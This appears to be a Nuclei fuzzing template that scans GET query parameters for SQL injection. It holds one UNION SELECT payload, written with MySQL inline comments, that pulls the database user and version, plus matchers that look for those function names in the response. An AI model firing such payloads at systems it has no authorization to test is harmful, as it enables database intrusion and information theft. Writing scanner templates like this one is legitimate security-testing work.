id: fuzz-sqli-union-select

info:
  name: SQL Injection Union Select Detection
  author: netbaan
  severity: medium
  description: |
    This template is designed to detect SQL Injection vulnerabilities using a UNION SELECT payload.

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'  # Run only on GET requests

    payloads:
      sqli_payload:
        - "0%20/*!union*/%20/*!select*/%201,2,3,4,user(),6,7,version(),9,10,11"

    stop-at-first-match: true

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{sqli_payload}}"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "user()"      # Check for user function in the response
          - "version()"   # Check for version function in the response

      - type: status
        status:
          - 200          # Expecting a 200 OK response